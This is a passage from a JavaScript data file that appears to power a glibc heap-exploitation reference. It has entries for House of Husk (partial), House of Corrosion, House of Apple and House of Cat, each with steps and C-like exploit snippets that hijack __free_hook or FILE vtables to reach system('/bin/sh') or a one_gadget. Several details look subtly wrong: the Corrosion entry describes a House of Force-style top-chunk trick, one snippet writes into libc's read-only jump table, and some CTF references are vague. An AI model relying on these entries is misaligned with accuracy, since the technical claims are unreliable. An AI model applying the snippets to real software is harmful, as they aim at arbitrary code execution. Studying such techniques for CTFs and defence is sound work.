*(uint64_t*)printf_func_table = arginfo_table_addr;
// Set arginfo entry for a specific format char to one_gadget
*(uint64_t*)(arginfo_table_addr + CHAR_OFFSET * 8) = one_gadget;

// Trigger printf with format specifier matching char
printf("%<char>");  // jumps to one_gadget!`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_husk.c',
    dhavalkapilChapter: '',
    ctfChallenges: [
      { name: 'Balsn CTF 2020: Plain Text', year: '2020', link: 'https://ctftime.org' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.32+'],
    relatedTechniques: ['house-of-orange', 'fsop-exploit']
  },

  house_of_corrosion: {
    id: 'house-of-corrosion',
    name: 'House of Corrosion',
    description: 'Exploits a heap overflow into the top chunk size field to shrink it, then uses that to corrupt various global variables (like __free_hook) by manipulating the distance between the top chunk and the target.',
    category: 'top-chunk',
    vulnerability: 'Heap overflow into top chunk to shrink its size, enabling heap-relative arbitrary writes',
    glibcVersions: ['2.23-2.29'],
    prerequisites: [
      'Heap overflow into top chunk header',
      'Ability to allocate many chunks (to exhaust manipulated top)',
      'Knowledge of heap base address (partial write possible)'
    ],
    constraints: [
      'Top chunk must be accessible via overflow',
      'Target must be within modified top chunk range',
      'Works best when __free_hook is still writable (pre-2.32)'
    ],
    steps: [
      '1. Overflow into top chunk, set size to a small value (e.g., 0x1).',
      '2. Allocate many chunks to exhaust the remaining (tiny) top chunk.',
      '3. When top cannot service request, sysmalloc extends — top chunk now resets.',
      '4. The distance between old heap and new extension can be predicted.',
      '5. Use targeted allocations to write to known offsets like __free_hook.',
      '6. Overwrite __free_hook with system or one_gadget.',
      '7. Free a chunk containing "/bin/sh" to trigger.'
    ],
    exploitationPath: [
      {
        name: '__free_hook via Top Chunk Shrink',
        description: 'Shrink top chunk to get arbitrary write to __free_hook',
        code: `// Overflow into top chunk, shrink its size
*(uint64_t*)(top_chunk + 8) = 0x1;  // top_chunk->size = 1

// Now malloc fails to allocate from top, calls sysmalloc
// Top chunk gets extended
void *p1 = malloc(HUGE_SIZE);  // triggers sysmalloc extension

// Distance to __free_hook is now calculable
// Allocate specific size to land at __free_hook
size_t distance = free_hook - new_top;
void *p2 = malloc(distance);  
void *p3 = malloc(0x10);  // p3 @ __free_hook

*(uint64_t*)p3 = &system;  // overwrite __free_hook
free("/bin/sh");             // system("/bin/sh")`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_corrosion.c',
    dhavalkapilChapter: '',
    ctfChallenges: [
      { name: 'Corruption CTF 2021', year: '2021', link: '' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.32+'],
    relatedTechniques: ['house-of-force', 'tcache-poisoning']
  },

  house_of_apple: {
    id: 'house-of-apple',
    name: 'House of Apple',
    description: 'FSOP-based technique that corrupts the _IO_FILE vtable pointer or wide-data pointers to redirect execution during IO dispatch (e.g., when exit() flushes stdout). Works on glibc 2.35+ even with vtable verification checks.',
    category: 'house',
    vulnerability: 'Controlled write to corrupt _IO_FILE structure (vtable or _wide_data) in libc or heap',
    glibcVersions: ['2.35+'],
    prerequisites: [
      'UAF or heap overflow to corrupt _IO_FILE structure',
      'Libc address leak (mandatory)',
      'Ability to trigger IO operations (exit, puts, etc.)'
    ],
    constraints: [
      'Requires a leak of libc base',
      'Vtable verification in glibc 2.24+ restricts vtable hijack scope',
      'Must redirect vtable into _IO_wfile_jumps area or use _wide_data technique'
    ],
    steps: [
      '1. Leak libc base address.',
      '2. Corrupt a _IO_FILE\'s _wide_data pointer to point to a controlled buffer.',
      '3. Craft the wide data buffer to contain a vtable pointer.',
      '4. Point vtable to _IO_wfile_jumps + offset to redirect _IO_wfile_overflow.',
      '5. Trigger the IO flush (exit() or assert failure).',
      '6. Execution redirects through the corrupted vtable to one_gadget or system.'
    ],
    exploitationPath: [
      {
        name: '_IO_wfile_overflow Hijack via Wide Data',
        description: 'Corrupt _wide_data in _IO_FILE to redirect vtable dispatch through _IO_wfile_jumps',
        code: `// Leak libc base
uint64_t libc_base = leak_libc();

// Forge wide_data on heap or in controlled memory
struct _IO_FILE *fake = (struct _IO_FILE *)controlled_mem;
// Set _wide_data to point to our crafted buffer
fake->_wide_data = (struct _IO_wide_data *)wide_buf;

// Craft wide_data with vtable pointing near _IO_wfile_jumps
wide_buf->_wide_vtable = _IO_wfile_jumps + TARGET_OFFSET;

// Set _IO_WRITE_FLAG and call _IO_wfile_overflow
// When exit() is called, stdout flush triggers our vtable
exit(0);  // triggers _IO_wfile_overflow → one_gadget`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_apple.c',
    dhavalkapilChapter: '',
    ctfChallenges: [
      { name: 'HZHAG CTF 2022:_fmt', year: '2022', link: '' }
    ],
    difficulty: 'Expert',
    patchedIn: [],
    relatedTechniques: ['house-of-orange', 'fsop-exploit', 'house-of-cat']
  },

  house_of_cat: {
    id: 'house-of-cat',
    name: 'House of Cat',
    description: 'Modern FSOP technique for glibc 2.35+ that corrupts _IO_wide_data to chain through _IO_wfile_jumps → _IO_wfile_overflow. Similar to House of Apple but with a different trigger path through the wide data vtable.',
    category: 'house',
    vulnerability: 'Controlled write to _IO_wide_data or vtable of _IO_FILE structures',
    glibcVersions: ['2.35+'],
    prerequisites: [
      'UAF or controlled write to corrupt _IO_FILE structure',
      'Libc address leak',
      'Exit or assert path that flushes IO streams'
    ],
    constraints: [
      'Requires libc leak',
      'Must bypass vtable verification by staying within _IO_wfile_jumps',
      'More complex chain than classic FSOP'
    ],
    steps: [
      '1. Leak libc base address.',
      '2. Find or create a controllable _IO_FILE structure (often via large bin attack + FSOP).',
      '3. Set _wide_data pointer in the _IO_FILE to point to attacker-controlled memory.',
      '4. In the wide_data buffer, set _wide_vtable to _IO_wfile_jumps.',
      '5. Set flags to trigger _IO_wfile_overflow path.',
      '6. Call exit() or trigger an IO flush.',
      '7. _IO_wfile_overflow dispatches through corrupted wide vtable to one_gadget.'
    ],
    exploitationPath: [
      {
        name: '_IO_wfile_overflow Chain to RCE',
        description: 'Use wide_data vtable hijack to bypass vtable checks and execute arbitrary function',
        code: `// Forge _IO_FILE on heap
uint64_t libc = leak_libc();
uint64_t system = libc + SYSTEM_OFFSET;
uint64_t wfile_jumps = libc + _IO_WFILE_JUMPS_OFFSET;

// Corrupt _IO_FILE:
// Set _flags to trigger wide char write path (0x800 | 0x1)
// Set _wide_data to controlled heap addr
file->_flags = 0x800 | 0x2;
file->_wide_data = (void*)controlled_addr;

// In controlled area, set _wide_vtable
// _IO_wfile_overflow → goes through _wide_vtable
controlled._wide_vtable = wfile_jumps + DELTA;

// Set function pointer offset to one_gadget
*(uint64_t*)(wfile_jumps + DELTA) = one_gadget;

exit(0);  // flush triggers → _IO_wfile_overflow → one_gadget`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_cat.c',
    dhavalkapilChapter: '',
    ctfChallenges: [
      { name: '2022 CTF Challenge', year: '2022', link: '' }
    ],
    difficulty: 'Expert',
    patchedIn: [],
    relatedTechniques: ['house-of-apple', 'house-of-orange', 'fsop-exploit']
  }
};

export const HEAP_CATEGORIES = {
  fastbin: 'Fastbin Exploitation',
  tcache: 'Tcache Exploitation',
  'top-chunk': 'Top Chunk Exploitation',
  unsorted: 'Unsorted Bin Attack',
  'large-bin': 'Large Bin Attack',
  house: 'House Exploits',
  'glibc-specific': 'Glibc Version Specific'
};
